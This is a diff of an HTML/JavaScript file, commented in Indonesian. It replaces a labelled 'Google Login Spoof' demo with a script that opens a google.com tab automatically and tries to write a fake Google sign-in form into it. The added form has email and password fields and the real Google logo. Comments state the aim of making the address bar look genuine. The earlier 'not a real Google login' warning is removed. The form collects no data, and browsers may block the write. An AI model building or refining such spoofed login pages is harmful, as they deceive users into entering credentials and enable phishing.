@@ -1,135 +1,53 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Google Login Spoof</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f2f2f2;
-      margin: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      flex-direction: column;
-      gap: 20px;
-    }
-    .redirect-button {
-      padding: 12px 24px;
-      font-size: 16px;
-      border-radius: 6px;
-      background-color: #4285F4;
-      color: white;
-      border: none;
-      cursor: pointer;
-      box-shadow: 0 4px 12px rgba(66, 133, 244, 0.5);
-      transition: background-color 0.3s ease;
-    }
-    .redirect-button:hover {
-      background-color: #357ae8;
-    }
-  </style>
-</head>
-<body>
-  <button class="redirect-button" onclick="spoof()">Click to spoof Google Login</button>
+<script>
+  // Buka tab baru ke domain Google (alamat URL terlihat asli)
+  let spoofTab = window.open("https://www.google.com/csi", "_blank");
 
-  <script>
-    function spoof() {
-      // Buka tab baru pointing ke Google (akan tampil sebagai trusted domain)
-      let spoofTab = window.open("https://www.google.com/csi", "_blank");
-
-      // Delay injeksi konten sampai tab terbuka (bypass race condition)
-      setTimeout(() => {
-        try {
-          spoofTab.document.write(`
-            <!DOCTYPE html>
-            <html>
-            <head>
-              <title>Google</title>
-              <style>
-                body {
-                  font-family: Arial, sans-serif;
-                  background: #f2f2f2;
-                  margin: 0;
-                  display: flex;
-                  justify-content: center;
-                  align-items: center;
-                  height: 100vh;
-                }
-                .login-container {
-                  background: white;
-                  padding: 40px 50px;
-                  border-radius: 8px;
-                  box-shadow: 0 8px 24px rgb(0 0 0 / 0.2);
-                  width: 360px;
-                  text-align: center;
-                }
-                .logo {
-                  font-size: 48px;
-                  font-weight: 700;
-                  margin-bottom: 24px;
-                  user-select: none;
-                }
-                .logo .g { color: #4285F4; }
-                .logo .o1 { color: #EA4335; }
-                .logo .o2 { color: #FBBC05; }
-                .logo .g2 { color: #4285F4; }
-                .logo .l { color: #34A853; }
-                .logo .e { color: #EA4335; }
-                input[type="email"], input[type="password"] {
-                  width: 100%;
-                  padding: 12px 15px;
-                  margin: 8px 0 24px;
-                  border: 1px solid #dadce0;
-                  border-radius: 4px;
-                  font-size: 16px;
-                }
-                button {
-                  background-color: #4285F4;
-                  color: white;
-                  border: none;
-                  width: 100%;
-                  padding: 12px;
-                  font-size: 16px;
-                  border-radius: 4px;
-                  cursor: pointer;
-                }
-                button:hover {
-                  background-color: #357ae8;
-                }
-                .footer-text {
-                  margin-top: 20px;
-                  font-size: 12px;
-                  color: #666;
-                }
-                .funny-msg {
-                  color: red;
-                  font-weight: bold;
-                  margin-top: 15px;
-                }
-              </style>
-            </head>
-            <body>
-              <div class="login-container">
-                <div class="logo">
-                  <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
-                </div>
-                <h1>Sign in to your Google Account</h1>
-                <input type="email" placeholder="Email or phone" />
-                <input type="password" placeholder="Password" />
-                <button onclick="alert('Fake Google')">Next</button>
-                <div class="funny-msg">⚠️ This is not a real Google login!</div>
-                <div class="footer-text">© 2025 Google</div>
-              </div>
-            </body>
-            </html>
-          `);
-          spoofTab.document.close();
-        } catch (e) {
-          console.warn("Browser blocked access to spoofed tab:", e);
-        }
-      }, 100); // 100ms delay to allow tab to initialize
+  // Setelah beberapa detik, coba ubah isi halaman jika memungkinkan
+  setTimeout(() => {
+    try {
+      // Tulis konten palsu ke tab tersebut
+      spoofTab.document.open();
+      spoofTab.document.write(`
+        <title>Google</title>
+        <style>
+          body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background: #ffffff;
+          }
+          input {
+            padding: 12px;
+            margin: 8px;
+            width: 90%;
+            max-width: 300px;
+            font-size: 16px;
+          }
+          button {
+            padding: 10px 20px;
+            margin-top: 10px;
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            border-radius: 4px;
+          }
+        </style>
+        <body>
+          <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" width="160" />
+          <input type="email" placeholder="Email or phone" />
+          <input type="password" placeholder="Enter your password" />
+          <button>Next</button>
+        </body>
+      `);
+      spoofTab.document.close();
+    } catch (e) {
+      console.log("Tidak bisa inject konten ke tab karena cross-origin policy");
     }
-  </script>
-</body>
-</html>
+  }, 1000); // Tunggu 1 detik agar halaman termuat dulu
+</script>
